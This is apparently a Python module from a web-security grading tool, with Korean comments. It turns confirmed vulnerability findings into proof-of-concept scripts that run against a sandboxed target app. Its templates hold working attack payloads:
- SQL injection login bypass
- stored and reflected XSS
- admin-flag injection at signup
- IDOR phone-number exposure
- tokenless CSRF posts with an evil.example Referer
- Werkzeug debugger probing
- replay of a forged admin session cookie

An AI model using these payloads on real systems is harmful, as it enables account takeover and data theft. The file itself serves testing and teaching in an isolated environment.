"""PoC 스크립트 생성 — 확인된(취약) finding 을 격리 공격 컨테이너에서 재현하는
파이썬 코드로 변환한다. 각 스크립트는 공격 컨테이너에 미리 탑재된 ``poclib`` 을 쓴다:

    Client(TARGET)          대상 앱 클라이언트(세션·CSRF 자동 처리)
      .signup(extra=…)      회원가입(+로그인). extra 로 임의 필드 주입 가능
      .post(path, data)     JSON/폼 자동, CSRF 토큰 부착
      .get(path)            GET
      .my_id()              로그인한 사용자의 id
      .logged_in()          현재 세션이 인증 상태인지
    render(resp)            응답 HTML 을 "브라우저 속 브라우저" 패널로 보냄

``%%TARGET%%`` 는 세션의 대상 컨테이너 주소로 치환된다.
"""
from __future__ import annotations

import re
from typing import Dict, List, Optional

_TARGET = "%%TARGET%%"

# weak_default_secret / hardcoded_secret 공용 재생 PoC. 채점 중 session_forgery 가
# 이미 '관리자 접근에 성공한' 위조 세션 쿠키를 만들어 뒀으므로, 그 쿠키를 그대로
# 재생한다(Flask 세션 쿠키는 서버 상태·만료가 없어 같은 앱의 새 인스턴스에도 유효).
# %%COOKIE_NAME%% / %%COOKIE_VALUE%% / %%ADMIN_PATH%% 는 poc_terminals 가 주입한다.
_FORGERY_REPLAY = '''\
from poclib import render
import requests
TARGET = "%%TARGET%%"

# 약한/하드코딩된 SECRET_KEY 로 서명해 검증된 위조 세션 쿠키(관리자)
forged = {"%%COOKIE_NAME%%": "%%COOKIE_VALUE%%"}
admin_path = "%%ADMIN_PATH%%"

base = requests.get(f"{TARGET}{admin_path}", timeout=8, allow_redirects=False)
print(f"[ctl] 쿠키 없이 GET {admin_path} -> {base.status_code}")

r = requests.get(f"{TARGET}{admin_path}", cookies=forged, timeout=8)
print(f"[atk] 위조 세션 쿠키로 GET {admin_path} -> {r.status_code}")
low = (r.text or "").lower()
if r.status_code == 200 and ("admin" in low or "관리자" in low or "user" in low):
    print("[!] EXPLOITED: 위조 세션 쿠키로 관리자 권한 획득 → 인증 우회·계정 탈취")
    render(r)
else:
    print("[-] 방어됨: 서명 검증으로 위조 쿠키가 거부됨")
'''


# check_id -> PoC 파이썬 소스. "방어 안 했다면" 성공하는 실제 공격.
_TEMPLATES: Dict[str, str] = {
    "privilege_escalation": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

# 가입 요청에 is_admin 을 실어 보낸다 — 서버가 그대로 믿는지
atk = Client(TARGET).signup(extra={"is_admin": True, "role": "admin"})
ctl = Client(TARGET).signup()                 # 대조군: 평범한 가입

a = atk.get("/admin"); c = ctl.get("/admin")
print(f"[atk] GET /admin -> {a.status_code}")
print(f"[ctl] GET /admin -> {c.status_code}")
if a.status_code == 200 and c.status_code != 200:
    print("[!] EXPLOITED: 클라이언트가 보낸 is_admin 을 신뢰 → 관리자 탈취")
    render(a)
else:
    print("[-] 방어됨: is_admin 주입이 무시됨")
''',

    "sqli": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

c = Client(TARGET)
payload = "' OR '1'='1' -- "
r = c.post("/login", {"username": payload, "password": "x"})
print(f"[*] /login  username={payload!r} -> {r.status_code}")
if c.logged_in():
    print("[!] EXPLOITED: 인증 우회 성공 — 첫 사용자로 로그인됨")
    render(c.get("/posts"))
else:
    print("[-] 방어됨: 매개변수 바인딩으로 인젝션 차단")
''',

    "idor_profile": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

PHONE = "01055012047"                  # userA 사적 PII(전화번호) — 프롬프트 예시(01012345678)와
                                       # 겹치지 않는 값이라 앱 시드와 충돌하지 않는다
usera = Client(TARGET).signup(username="poc_ua", phone=PHONE)
userb = Client(TARGET).signup(username="poc_ub")

uid = usera.my_id()                    # userA 자신의 id
r = userb.get(f"/users/{uid}")         # 공격: userB 세션으로 userA 프로필 조회
print(f"[*] userB -> GET /users/{uid} : {r.status_code}")
digits = "".join(c for c in r.text if c.isdigit())   # 앱이 형식을 바꿔도 매칭
if PHONE in digits:
    print("[!] EXPLOITED: 타인(userA) 전화번호 노출 → IDOR/PII")
    render(r)
else:
    print("[-] 방어됨: 타인 리소스 접근 차단")
''',

    "access_control_admin": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

user = Client(TARGET).signup()         # 일반 사용자
for path in ("/admin", "/admin/users"):
    r = user.get(path)
    print(f"[*] 일반 사용자 GET {path} -> {r.status_code}")
    if r.status_code == 200 and "admin" in r.text.lower():
        print(f"[!] EXPLOITED: {path} 가 일반 사용자에게 노출 → 접근통제 실패")
        render(r); break
else:
    print("[-] 방어됨: 관리자 페이지 차단")
''',

    "stored_xss": '''\
from poclib import Client, render
import uuid
TARGET = "%%TARGET%%"

c = Client(TARGET).signup()
marker = "xss_" + uuid.uuid4().hex[:6]
c.post("/posts", {"title": "hi",
                  "content": f"<script>document.title='{marker}'</script>"})
r = c.get("/posts")
print("[*] 게시글 목록 렌더 확인...")
if "<script>" in r.text:
    print("[!] EXPLOITED: 스크립트가 이스케이프 없이 저장·출력됨 → 저장형 XSS")
    render(r)
else:
    print("[-] 방어됨: 템플릿 자동 이스케이프")
''',

    "reflected_xss": '''\
from poclib import Client, render
TARGET = "%%TARGET%%"

c = Client(TARGET)
payload = "<script>document.title='XSS'</script>"
r = c.get(f"/search?q={payload}")
print(f"[*] GET /search?q=<script> -> {r.status_code}")
if "<script>" in r.text:
    print("[!] EXPLOITED: 검색어가 이스케이프 없이 반사됨 → 반사형 XSS")
    render(r)
else:
    print("[-] 방어됨: 반사 지점 이스케이프")
''',

    "csrf_protection": '''\
from poclib import Client, render
import uuid
TARGET = "%%TARGET%%"

# 인증된 세션을 만든 뒤, CSRF 토큰 없이 원시 세션으로 상태변경 POST 를 보낸다.
# (poclib.Client.post 는 토큰을 자동 부착하므로, 인증 쿠키만 가진 raw 세션을 쓴다)
# 서버가 토큰을 검증하지 않으면 외부 출처 요청만으로 글이 작성된다 → CSRF.
atk = Client(TARGET).signup()
marker = "csrf_" + uuid.uuid4().hex[:6]
raw = atk.sess                          # 인증 쿠키 유지, CSRF 토큰은 부착하지 않음

created = False
for kw in ({"json": {"title": marker, "content": marker}},
           {"data": {"title": marker, "content": marker}}):
    try:
        r = raw.post(f"{TARGET}/posts", timeout=8,
                     headers={"Referer": "http://evil.example/"}, **kw)
    except Exception:
        continue
    fmt = "json" if "json" in kw else "form"
    print(f"[*] 토큰 없이 POST /posts ({fmt}, Referer: evil) -> {r.status_code}")
    if r.status_code in (200, 201, 302):
        created = True
        break

check = atk.get("/posts")
if created and marker in (check.text or ""):
    print("[!] EXPLOITED: CSRF 토큰 검증 없음 → 외부 출처 위조 요청으로 글 작성 성공")
    render(check)
else:
    print("[-] 방어됨: CSRF 토큰 없는 상태변경 요청이 거부됨")
''',

    "debug_true": '''\
from poclib import render
import requests, uuid
TARGET = "%%TARGET%%"

def is_debugger(resp):
    b = resp.text or ""
    return ("Werkzeug Debugger" in b) or ("__debugger__" in b) or \\
           ("Traceback (most recent call last)" in b and "console" in b.lower())

# 1) 임의 예외를 유발해 대화형 디버거(스택트레이스 + /console)가 뜨는지
hit = None
for p in ("/" + uuid.uuid4().hex, "/users/not-an-int", "/posts/%00"):
    try:
        r = requests.get(f"{TARGET}{p}", timeout=8)
    except Exception:
        continue
    if r.status_code >= 500 and is_debugger(r):
        hit = r
        break

# 2) 예외를 못 만들어도, 디버거 미들웨어 리소스가 응답하면 debug=True 확정
if hit is None:
    try:
        r = requests.get(f"{TARGET}/?__debugger__=yes&cmd=resource&f=debugger.js", timeout=8)
        ct = r.headers.get("Content-Type", "").lower()
        if r.status_code == 200 and "javascript" in ct and "debugger" in (r.text or "").lower():
            hit = r
    except Exception:
        pass

if hit is not None:
    print("[!] EXPLOITED: Werkzeug 디버그 모드 노출 → /console 대화형 콘솔에서 원격 코드 실행 가능")
    render(hit)
else:
    print("[-] 방어됨: 디버그 모드 비활성(운영 설정)")
''',

    # weak_default_secret / hardcoded_secret 는 같은 재생 PoC(_FORGERY_REPLAY) 를 쓴다.
    "weak_default_secret": _FORGERY_REPLAY,
    "hardcoded_secret": _FORGERY_REPLAY,
}

# 재생형 PoC(위조 쿠키 주입 필요) — 이 체크들은 session_forgery 의 검증된 쿠키가
# 있을 때만 PoC 탭을 만든다.
_FORGERY_CHECKS = ("weak_default_secret", "hardcoded_secret")


def has_poc(check_id: str) -> bool:
    return check_id in _TEMPLATES


def build_poc_source(check_id: str, target_url: str) -> Optional[str]:
    src = _TEMPLATES.get(check_id)
    return src.replace(_TARGET, target_url) if src else None


def is_attackable(finding: dict) -> bool:
    """PoC 탭 대상 = 재현 가능한 '확정 익스플로잇'만 (score 0). 부분·불확정 실패
    (idor control_broken=60, sqli error_leak=40 등)는 실제 익스플로잇이 아니라
    PoC 가 정직하게 '방어됨'으로 나오므로 탭을 띄우지 않는다."""
    return (
        has_poc(finding.get("check_id", ""))
        and not finding.get("passed")
        and not finding.get("skipped")
        and float(finding.get("score", 0) or 0) == 0
    )


# session_forgery 증거에서 '검증된' 위조 쿠키와 접근 성공 경로를 뽑아낸다.
#   evidence: ["forged session=eyJ...", "/admin -> 200 (admin 콘텐츠 렌더)"]
_FORGED_COOKIE_RE = re.compile(r"forged\s+([^=\s]+)=(\S+)")
_FORGED_PATH_RE = re.compile(r"(/\S*)\s*->\s*200")


def _forgery_evidence(all_findings: List[dict]) -> Optional[dict]:
    """채점 중 session_forgery 가 실제로 성공시킨 위조 쿠키(name/value) + 접근 경로.
    확인된 위조가 없으면 None → 재생 PoC 를 만들지 않는다(정직)."""
    for f in all_findings or []:
        if f.get("check_id") != "session_forgery":
            continue
        if f.get("passed") or f.get("skipped"):
            continue
        name = value = None
        path = "/admin"
        for ev in f.get("evidence", []) or []:
            s = str(ev)
            cm = _FORGED_COOKIE_RE.search(s)
            if cm:
                name, value = cm.group(1), cm.group(2)
            pm = _FORGED_PATH_RE.search(s)
            if pm:
                path = pm.group(1)
        if name and value:
            return {"name": name, "value": value, "path": path}
    return None


def poc_terminals(
    findings: List[dict],
    all_findings: Optional[List[dict]] = None,
    target_url: str = "http://target:5000",
) -> List[dict]:
    """확정 익스플로잇 finding 만 → 터미널 탭 목록. ``target_url`` 은 세션의 대상
    컨테이너 주소(라이브 세션 없이 표시만 할 때는 플레이스홀더). ``all_findings`` 는
    weight 0 인 session_forgery(가시 목록에서 제외됨)까지 포함한 전체 목록으로,
    재생형 PoC 에 주입할 검증된 위조 쿠키를 여기서 교차 참조한다."""
    forged = _forgery_evidence(all_findings if all_findings is not None else findings)
    out: List[dict] = []
    for f in findings:
        if not is_attackable(f):
            continue
        cid = f["check_id"]
        code = build_poc_source(cid, target_url)
        if cid in _FORGERY_CHECKS:
            # 검증된 위조 쿠키가 없으면(약한/하드코딩 시크릿이 실제 관리자 탈취로
            # 이어지지 못함) 재생 PoC 는 무의미하므로 탭을 만들지 않는다.
            if not forged or not code:
                continue
            code = (code.replace("%%COOKIE_NAME%%", forged["name"])
                        .replace("%%COOKIE_VALUE%%", forged["value"])
                        .replace("%%ADMIN_PATH%%", forged["path"]))
        out.append({
            "check_id": cid,
            "label": f.get("label", cid),
            "owasp": f.get("owasp", ""),
            "code": code,
        })
    return out
